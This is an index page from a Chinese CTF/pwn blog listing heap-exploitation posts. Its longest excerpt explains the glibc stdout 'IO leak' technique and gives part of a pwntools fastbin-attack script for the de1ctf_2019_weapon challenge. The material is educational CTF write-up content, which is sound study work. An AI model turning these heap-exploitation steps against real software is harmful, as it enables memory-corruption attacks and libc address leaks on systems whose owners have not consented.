<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="万古凡间一过客，九天之上第一仙">
<meta property="og:type" content="website">
<meta property="og:title" content="ZIKH26&#39;s Blog">
<meta property="og:url" content="https://zikh26.github.io/page/3/index.html">
<meta property="og:site_name" content="ZIKH26&#39;s Blog">
<meta property="og:description" content="万古凡间一过客，九天之上第一仙">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="ZIKH26">
<meta property="article:tag" content="CTF PWN IT">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://zikh26.github.io/page/3/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/3/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ZIKH26's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">ZIKH26's Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="ZIKH26"
      src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
  <p class="site-author-name" itemprop="name">ZIKH26</p>
  <div class="site-description" itemprop="description">万古凡间一过客，九天之上第一仙</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">98</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">100</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/81a94eee.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/81a94eee.html" class="post-title-link" itemprop="url">预测urandom的输出</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:53:23" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%A7%81%E6%88%BF%E8%8F%9C/" itemprop="url" rel="index"><span itemprop="name">私房菜</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          Here's something encrypted, password is required to continue reading.
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/posts/81a94eee.html#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/5bd42122.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/5bd42122.html" class="post-title-link" itemprop="url">未初始化漏洞--strcat函数溢出</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:53:15" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%A7%81%E6%88%BF%E8%8F%9C/" itemprop="url" rel="index"><span itemprop="name">私房菜</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          Here's something encrypted, password is required to continue reading.
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/posts/5bd42122.html#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/d12f5bed.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/d12f5bed.html" class="post-title-link" itemprop="url">浅尝拟态防御</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:53:05" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%A7%81%E6%88%BF%E8%8F%9C/" itemprop="url" rel="index"><span itemprop="name">私房菜</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          Here's something encrypted, password is required to continue reading.
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/posts/d12f5bed.html#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/12414989.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/12414989.html" class="post-title-link" itemprop="url">关于tcache stashing unlink attack的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-05-15 07:36:47" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-07-01 17:03:03" itemprop="dateModified" datetime="2023-07-01T17:03:03+08:00">2023-07-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><blockquote>
<p>介绍：在2.29的libc版本中，进行了unsorted bin的双向链表完整性检查。因此unsorted bin attack也就失效了，不过在libc2.29的版本中tcache stashing unlink attack却可以达到类似的效果(在一个任意地址写入一个libc地址)。</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/posts/12414989.html#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/f0d8c344.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/f0d8c344.html" class="post-title-link" itemprop="url">关于house of orange(unsorted bin attack &&FSOP)的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-05-15 07:36:47" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-07-01 17:03:41" itemprop="dateModified" datetime="2023-07-01T17:03:41+08:00">2023-07-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h2><p>通过学习house of orange，又对unsorted bin attack以及FSOP有了一些新的理解。说到底house of orange本身的效果很小，但加上两个组合拳(unsorted bin attack和FSOP)则威力就会变的很大。这篇文章我将对这三种手法都详细记录一下原理和利用方式，最后放上例题。</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/posts/f0d8c344.html#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/cb4bda90.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/cb4bda90.html" class="post-title-link" itemprop="url">沙箱逃逸----切换进程工作模式绕过</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-05-15 07:36:47" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-07-01 17:04:33" itemprop="dateModified" datetime="2023-07-01T17:04:33+08:00">2023-07-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>这两天打 <strong>CSAW</strong> 又学到了一种新的沙箱逃逸的方法–切换进程的工作模式，使用32位的系统调用号执行系统调用，来绕过原本沙箱禁用掉的系统调用。理解起来倒也不难，但是有几个点需要注意一下，这里详细的记录下利用过程。</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/posts/cb4bda90.html#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/a9dd00f0.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/a9dd00f0.html" class="post-title-link" itemprop="url">关于IO leak的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:51:24" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>近期针对io leak这个手法，进行了学习，并做了几道相关题目。整理了一下，写了这篇文章。以后遇到了新的io leak的题目，再更新上来。</p>
<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><blockquote>
<p>大致原理：</p>
<p>通过篡改_IO_2_1_stdout_结构体中的flags字段和_IO_write_base字段，通过篡改flags字段来绕过一些检查，通过篡改_IO_write_base字段使得系统调用write打印_IO_write_base字段与_IO_write_ptr字段之间的内容泄露出libc地址。</p>
<p>使用前提：</p>
<p>1、程序没有show函数</p>
<p>2、开启了FULL RELRO保护</p>
<p>利用过程：</p>
<p>1、想办法将_IO_2_1_stdout_结构体申请出来。</p>
<p>2、往_IO_2_1_stdout_结构体写入构造好的数据(具体是什么下面会说)。</p>
<p>3、执行任意一个puts函数，就可以将libc地址泄露出来。</p>
</blockquote>
<h2 id="第一步–申请"><a href="#第一步–申请" class="headerlink" title="第一步–申请"></a>第一步–申请</h2><p>在不同的libc版本，申请时也有略微的区别。</p>
<h3 id="不同libc版本对于stdout结构体的申请"><a href="#不同libc版本对于stdout结构体的申请" class="headerlink" title="不同libc版本对于stdout结构体的申请"></a>不同libc版本对于stdout结构体的申请</h3><p>先说2.27和2.31这两个版本，因为在这两个版本时，没有针对tcachebin的fd指针进行相关保护。就导致了tcache poisoning修改其fd指针就可以直接将堆块申请出来。所以我们只要能控制fd指针，就可以直接将_IO_2_1_stdout_结构体(之后统称为stdout结构体)申请出来。</p>
<p>而在2.23的libc版本中，从fastbin中申请堆块是对size位进行了检查。而我们能伪造size通过检查的地址只有malloc_hook-0x23和stdout结构体地址-0x43这两处。不过还好我们依然可以通过伪造size将stdout结构体申请出来。因此只要能控制fastbin中的fd指针，问题依然不大。</p>
<p>PS：为什么只有2.23 2.27 2.31这三个版本的libc。淦，因为目前只练习了这三个版本的io leak。</p>
<h3 id="爆破一比特申请stdout结构体"><a href="#爆破一比特申请stdout结构体" class="headerlink" title="爆破一比特申请stdout结构体"></a>爆破一比特申请stdout结构体</h3><p>但上面这两种情况都没有考虑到一个问题，就是使用io leak的时候，肯定我们是没有libc地址的，那我们就无法直接将tcachebin或者fastbin的fd指针修改为stdout结构体地址。对此我们采用的策略是利用unsorted bin中的fd指针进行利用。因为unsorted bin中的fd指针指向了的是main arena+88或者main arena+96的位置，这里位于libc中。如果这个地址能出现在fastbin或者tcachebin中fd的位置，且我们可以对fd指针进行编辑，那我们就可以将其修改为stdout结构体地址(stdout结构体地址的后三位是固定的，但是倒数第四位会因为ASLR的原因而随机化，可我们只能写入两字节，无法写入一个半字节，因此倒数第四位只能通过爆破来预测)。</p>
<h3 id="如何在fastbin或者tcachebin中留下unsorted-bin中的fd指针？具体情况，具体分析"><a href="#如何在fastbin或者tcachebin中留下unsorted-bin中的fd指针？具体情况，具体分析" class="headerlink" title="如何在fastbin或者tcachebin中留下unsorted bin中的fd指针？具体情况，具体分析"></a>如何在fastbin或者tcachebin中留下unsorted bin中的fd指针？具体情况，具体分析</h3><p>而如何让unsorted bin中的fd指针出现在fastbin或者tcachebin中的fd的位置，这就属于八仙过海各显神通了，不同题目的思路都不一样。这里就具体题目具体分析吧。</p>
<h2 id="第二步–编辑"><a href="#第二步–编辑" class="headerlink" title="第二步–编辑"></a>第二步–编辑</h2><p>将stdout结构体申请出来后，正常情况下是可以往里面写入数据的。</p>
<p>我们需要<strong>覆盖stdout结构体中的_flags字段为0xfbad1887，并且覆盖_IO_read_ptr、_IO_read_end、_IO_read_base这三个指针为0，最后覆盖_IO_write_base指针的最后一字节为00</strong>(这里并不是非要为00，因为到时候puts函数会泄露_IO_write_base指针与_IO_write_ptr指针之间的所有数据，只要将_IO_write_base指针改的小于_IO_write_ptr指针并且确定这二者之间存在libc地址，那么都是可以的，只不过我通常将其覆盖为\x00)</p>
<p>至于为什么要将_flags字段改为0xfbad1887这个值，是因为这个字段的各个比特位都属于标志位，不同比特位存在的意义不同，能绕过的检查也不同。而将_flags字段改为0xfbad1887这个值，正好可以绕过阻止我们完成io leak的所有检查(具体是哪些检查又或者如何绕过的，可以去网上看一下其他师傅的博客，当时感觉师傅们写的很全并且很好，我就没再去单独写了)，然后read那三个指针，我试了一下，他们的值无所谓(不一定非要写成00)。</p>
<p>编辑后stdout结构体如下：</p>
<p><img src="/../img/2706180-20220826111011178-1206554709.png"></p>
<h2 id="第三步–泄露"><a href="#第三步–泄露" class="headerlink" title="第三步–泄露"></a>第三步–泄露</h2><p>emmm，前两步都完成的话，第三步执行puts函数时顺其自然就泄露了libc地址，这个就没啥好说的了。</p>
<h1 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h1><h2 id="de1ctf-2019-weapon"><a href="#de1ctf-2019-weapon" class="headerlink" title="de1ctf_2019_weapon"></a>de1ctf_2019_weapon</h2><h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/2706180-20220826111041719-1027187867.png"></p>
<h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><img src="/../img/2706180-20220826111054199-1620326152.png"></p>
<p>delete函数中存在UAF漏洞。</p>
<h3 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h3><p>在2.23的libc中的话，可以利用UAF打一个double free。利用edit函数的话再打一个fastbin attack。_IO_2_1_stdout结构体上方和__malloc_hook上方都有一个0x7f(这个具体的要求就是有一个0x7f开头的地址，然后该地址的下一个内存单元为NULL)，可以去利用fastbin attack从这里申请出来一个fake chunk，最终可以泄露libc地址或者劫持hook获取shell。</p>
<h4 id="伪造size，将chunk释放到unsorted-bin中"><a href="#伪造size，将chunk释放到unsorted-bin中" class="headerlink" title="伪造size，将chunk释放到unsorted bin中"></a>伪造size，将chunk释放到unsorted bin中</h4><p>由于这道题无法申请超过0x60的chunk，因此我们的正常chunk被释放掉无法进入unsorted bin中，所以需要先打一个fastbin attack将一个fake_chunk申请到某个堆块的size位上方，然后通过edit函数来篡改其size位。放入unsorted bin中的原因是因为我们无法泄露libc地址，因此无法直接拿到_IO_2_1_stdout结构体的地址，只能利用unsorted bin中的fd指针main_arena+88这个libc地址，通过篡改其后四比特位(最后三位是固定的，倒数第四位需要爆破)来获取_IO_2_1_stdout结构体上方的地址。</p>
<p>这部分脚本如下:</p>
<p>就是先打一个fastbin attack，然后申请出来fake chunk，篡改一个chunk的size即可。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="number">7</span>,<span class="string">&#x27;prevent_chunk&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x50&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_e,<span class="number">0xB35</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xe1</span>))</span><br></pre></td></tr></table></figure>

<p>下图已经篡改成功：</p>
<p><img src="/../img/2706180-20220826111117610-1516022746.png"></p>
<h4 id="将unsorted-bin中的堆块放入fastbin中"><a href="#将unsorted-bin中的堆块放入fastbin中" class="headerlink" title="将unsorted bin中的堆块放入fastbin中"></a>将unsorted bin中的堆块放入fastbin中</h4><p>因为需要打fastbin attack将main_arena+88这个地址进行篡改，所以要先把unsorted bin中的堆块放入fastbin中，想实现这个的话，还是用fastbin attack进行操作。</p>
